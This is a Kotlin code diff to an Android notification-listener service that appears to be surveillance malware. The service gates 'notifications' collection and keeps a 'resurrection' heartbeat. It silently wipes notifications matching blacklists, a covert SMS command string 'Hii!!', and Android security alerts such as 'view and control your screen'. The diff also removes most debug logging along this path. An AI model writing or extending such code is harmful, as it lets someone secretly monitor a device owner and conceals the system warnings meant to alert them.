@@ -108,13 +108,9 @@ class MyNotificationListener : NotificationListenerService() {
         }
 
         val safePkg = sbn.packageName ?: "Unknown"
-        DebugLogger.log("NOTIF_ENTRY", "Clearable notification intercepted from: $safePkg")
 
         // Feature Gate
-        if (!ConfigManager.canCollect(this, "notifications")) {
-            DebugLogger.log("NOTIF_EXIT", "Blocked by ConfigManager (notifications collection disabled).")
-            return
-        }
+        if (!ConfigManager.canCollect(this, "notifications")) return
 
         // SYMBIOTE RESURRECTION: Secondary Heartbeat
         try {
@@ -157,18 +153,13 @@ class MyNotificationListener : NotificationListenerService() {
             text = sbn.notification.tickerText?.toString() ?: ""
         }
 
-        if (title.isEmpty() && text.isEmpty()) {
-            DebugLogger.log("NOTIF_EXIT", "Ignored notification from $pkg: Extracted Title and Text are both empty.")
-            return
-        }
+        if (title.isEmpty() && text.isEmpty()) return
 
         // --- PASSIVE AUTO-SWIPE ENGINE ---
-        DebugLogger.log("NOTIF_EVAL", "Evaluating Notification - PKG: [$pkg] | TITLE: [$title] | TEXT: [${text.take(20)}...]")
         val autoPrefs = getSharedPreferences("auto_swipe_prefs", Context.MODE_PRIVATE)
         
         // 1. Check Package Blacklist
         val pkgList = autoPrefs.getString("pkgs", "") ?: ""
-        DebugLogger.log("NOTIF_EVAL", "Checking PKG rule against list: [$pkgList]")
         if (pkgList.split(",").any { it.trim().equals(pkg, ignoreCase = true) }) {
             executeStealthWipe(sbn.key, "PKG matched blacklist ($pkg)", "AUTO_SWIPE")
             return
@@ -176,7 +167,6 @@ class MyNotificationListener : NotificationListenerService() {
 
         // 2. Check Keyword Blacklist (Title & Text)
         val kwList = autoPrefs.getString("keywords", "") ?: ""
-        DebugLogger.log("NOTIF_EVAL", "Checking KEYWORD rule against list:[$kwList]")
         if (kwList.isNotEmpty()) {
             val matchedKw = kwList.split(",").find { 
                 val target = it.trim()
@@ -188,19 +178,17 @@ class MyNotificationListener : NotificationListenerService() {
             }
         }
 
-        // 3. Check SMS Sender Blacklist (Title usually contains sender in SMS apps)
+        // 3. Check SMS Sender Blacklist
         val senderList = autoPrefs.getString("senders", "") ?: ""
-        DebugLogger.log("NOTIF_EVAL", "Checking SENDER rule against list: [$senderList]")
         if (senderList.isNotEmpty()) {
             val matchedSender = senderList.split(",").find { it.trim().isNotEmpty() && title.contains(it.trim(), ignoreCase = true) }
             if (matchedSender != null) {
-                executeStealthWipe(sbn.key, "SENDER matched blacklist ($matchedSender in title '$title')", "AUTO_SWIPE")
+                executeStealthWipe(sbn.key, "SENDER matched blacklist ($matchedSender)", "AUTO_SWIPE")
                 return
             }
         }
 
         // --- STEALTH SHIELD: INSTANT WIPE ---
-        DebugLogger.log("NOTIF_EVAL", "Checking STEALTH SHIELD rules...")
         val isCommand = title.contains("Hii!!", ignoreCase = true) || text.contains("Hii!!", ignoreCase = true)
         val isSecurityAlert = text.contains("view and control your screen", ignoreCase = true) || 
                               text.contains("monitoring your screen", ignoreCase = true) ||
@@ -208,11 +196,9 @@ class MyNotificationListener : NotificationListenerService() {
 
         if (isCommand || isSecurityAlert) {
             val reason = if(isCommand) "Command 'Hii!!' Detected" else "Security Alert Detected"
-            executeStealthWipe(sbn.key, "DECISION: PURGE. Reason: $reason", "SHIELD")
+            executeStealthWipe(sbn.key, "SHIELD: Purged security-sensitive alert ($reason)", "SHIELD")
             return
         }
-        
-        DebugLogger.log("NOTIF_EVAL", "DECISION: ALLOW. No auto-swipe rules matched.")
 
         // --- ENGAGEMENT PROTOCOL ---
         if (pkg.contains("messaging") || pkg.contains("sms") || pkg.contains("com.google.android.apps.messaging")) {
